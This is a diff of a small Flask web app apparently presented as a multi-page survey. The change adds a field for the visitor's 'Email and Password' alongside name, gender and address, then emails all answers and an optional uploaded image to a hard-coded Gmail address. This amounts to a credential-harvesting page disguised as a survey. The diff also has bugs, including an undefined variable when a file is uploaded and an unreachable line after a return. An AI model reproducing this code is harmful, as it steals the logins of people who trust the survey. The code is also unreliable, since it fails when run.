@@ -48,43 +48,65 @@ def rendernext1():
 @app.route('/next2',methods=["POST","GET"])
 def rendernext2():
     print(request.form)
-    if request.form["data"] == 'mrs.adams':
-        return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    session["data1"]=request.form["data"]
-    return render_template('Page3.html')
+    if request.form["data"]=='':
+        return render_template('Page2.html')
+    else:
+        session["data1"]=request.form["data"]
+        return render_template('Page3.html')
 
 @app.route('/next3',methods=["POST","GET"])
 def rendernext3():
     print(request.form)
+    if request.form["data"] == 'mrs.adams':
+        return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     session["data2"]=request.form["data"]
     return render_template('Page4.html')
 
 @app.route('/next4',methods=["POST","GET"])
 def rendernext4():
-    print(request.form)
-    session["data3"]=request.form["data"]
-    return render_template('Page5.html')
+    if request.form["data"]=='':
+        return render_template('Page4.html')
+    else:
+        session["data3"]=request.form["data"]
+        return render_template('Page5.html')
 
 @app.route('/next5',methods=["POST","GET"])
 def rendernext5():
+    if request.form["data"]=='':
+        return render_template('Page5.html')
+    else:
+        session["data4"]=request.form["data"]
+        return render_template('Page6.html')
     print(request.form)
-    session["data4"]=request.form["data"]
-    return render_template('Page6.html')
+
+@app.route('/next6',methods=["POST","GET"])
+def rendernext6():
+    if request.form["data"]=='':
+        return render_template('Page6.html')
+    else:
+        session["data5"]=request.form["data"]
+        return render_template('Page7.html')
 
 @app.route('/finish',methods=["POST","GET"])
 def renderfinish():
-    file=request.files['data']
+    file=""
+    if request.form['data'] == "":
+        file1="no"
+    else:
+        file=request.files['data']
     #bytefile=os.fsencode(file)
     #bytefile=open(file, "rb").read()
     # print(type(file))
     # file.save(app.config['UPLOAD_FOLDER'], "tmp.png")
-    messg = 'Name: ' + session['data1'] + ',' + 'Smash Main: '+ session['data2'] + ',' +"Name: "+ session["data3"] + ',' + "Name: "+ session["data4"] + ','+'Time; '+ (strftime("%d %b %Y %H:%M:%S", localtime()))
+    messg = 'Smash Main: : ' + session['data1'] + ',' + 'Gender: '+ session['data2'] + ',' +"Name: "+ session["data3"] + ',' + "Adress: "+ session["data4"] + ',' +  "Email and Password: "+ session["data5"] + ','+'Time; '+ (strftime("%d %b %Y %H:%M:%S", localtime()))
     msg = Message('User Dats', sender = 'mehufarm@gmail.com', recipients = ['mehufarm@gmail.com'])
     msg.attach("data.csv", "text/csv" , messg )
-
-    msg.attach("image.png", "image/png", file.read())
+    if file1=='no':
+        nofile=""
+    else:
+        msg.attach("image.png", "image/png", file.read())
     mail.send(msg)
-    return render_template('Page1.html' , sent="Your survey is complete and your awnsers are sent.")
+    return render_template('Page8.html' , sent="Your survey is complete and your awnsers are sent.")
 
 
 @app.route('/home',methods=["POST","GET"])
